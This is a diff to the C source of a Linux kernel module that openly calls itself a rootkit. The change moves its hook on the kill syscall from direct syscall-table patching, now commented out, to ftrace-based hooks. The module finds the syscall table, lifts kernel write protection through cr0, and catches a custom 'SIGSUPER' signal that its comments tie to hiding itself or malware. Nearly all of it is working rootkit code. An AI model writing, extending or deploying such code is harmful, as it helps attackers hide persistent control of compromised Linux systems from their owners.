@@ -5,8 +5,10 @@
 #include <linux/kallsyms.h>         //also to get acces to kallsysm_lookup_name
 #include <linux/kprobes.h>          //work around for kernal 5.6.0 and above
 #include <linux/unistd.h>           // contains syscall numbers
-#include <linux/version.h>         // linux kernel versions 
-#include <linux/dirent.h>	   //contains dirent structs etc
+#include <linux/version.h>          // linux kernel versions 
+#include <linux/dirent.h>	        //contains dirent structs etc
+
+#include "ftrace_helper.h"          //helps 
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("infernexio");
@@ -34,7 +36,7 @@ enum signals{
 };
 
 #if PTREGS_SYSCALL_STUB
-static asmlinkage long hacked_kill(const struct pt_regs *regs){
+static asmlinkage long hook_kill(const struct pt_regs *regs){
     int sig = regs->si;
     
     if(sig == SIGSUPER){
@@ -51,7 +53,7 @@ static asmlinkage long hacked_kill(const struct pt_regs *regs){
 }
 
 #else
-static asmlinkage long hacked_kill(pid_t pid, int sig){
+static asmlinkage long hook_kill(pid_t pid, int sig){
     if(sig == SIGSUPER){
         printk(KERN_INFO "signal: %d == SIGSUPER :d | hide itself/malware/etc", sig, SIGSUPER);
         return 0;
@@ -66,39 +68,39 @@ static asmlinkage long hacked_kill(pid_t pid, int sig){
 }
 #endif
 
-static int cleanup(void){
-    /* kill */
-    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
+// static int cleanup(void){
+//     /* kill */
+//     __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
 
-    return 0;
-}
+//     return 0;
+// }
 
 /**
  * stores the id of the sys call to later hook
 */
-static int store(void){
-/* if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0) syscall use pt_regs stub*/
-#if PTREGS_SYSCALL_STUB
-    /* kill */
-    orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
-    printk(KERN_INFO "orig_kill table entry successfully sotred\n");
+// static int store(void){
+// /* if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0) syscall use pt_regs stub*/
+// #if PTREGS_SYSCALL_STUB
+//     /* kill */
+//     orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
+//     printk(KERN_INFO "orig_kill table entry successfully sotred\n");
 
-/* if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0) */
-#else
-    /* kill */
-    orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
-    printk(KERN_INFO "orig_kill table entry successfully sotred\n");
-#endif
+// /* if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0) */
+// #else
+//     /* kill */
+//     orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
+//     printk(KERN_INFO "orig_kill table entry successfully sotred\n");
+// #endif
 
-    return 0;
+//     return 0;
     
-}
+// }
 
-static int hook(void){
-    /* kill */
-    __sys_call_table[__NR_kill] = (unsigned long)&hacked_kill;
-    return 0;
-}
+// static int hook(void){
+//     /* kill */
+//     __sys_call_table[__NR_kill] = (unsigned long)&hacked_kill;
+//     return 0;
+// }
 
 /**
  * Custom write_cr0 function to unprotect memory
@@ -145,6 +147,10 @@ static unsigned long *get_syscall_table(void){
         return syscall_table;
 }
 
+static struct ftrace_hook hooks[] = {
+    HOOK("sys_kill", hook_kill, &orig_kill),
+};
+
 /**
  * start of the rootkit
  * like the main method
@@ -153,6 +159,9 @@ static int __init init_func(void){
     int err = 1;
     printk(KERN_INFO "rootkit: initalized\n");
 
+    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+
+
     __sys_call_table = get_syscall_table();
 
     if(!__sys_call_table){
@@ -160,15 +169,15 @@ static int __init init_func(void){
         return err;
     }
 
-    if(store() == err){
-        printk(KERN_INFO "error:store error\n");
-    }
+    // if(store() == err){
+    //     printk(KERN_INFO "error:store error\n");
+    // }
 
     unprotect_memory();
 
-    if(hook() == err){
-        printk(KERN_INFO "error: hook error\n");
-    }
+    // if(hook() == err){
+    //     printk(KERN_INFO "error: hook error\n");
+    // }
 
     protect_memory();
 
@@ -184,9 +193,11 @@ static void __exit exit_func(void){
 
     unprotect_memory();
 
-    if(cleanup() == err){
-        printk(KERN_INFO "error: clean up error\n");
-    }
+    err = fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+
+    // if(cleanup() == err){
+    //     printk(KERN_INFO "error: clean up error\n");
+    // }
 
     protect_memory();
 }
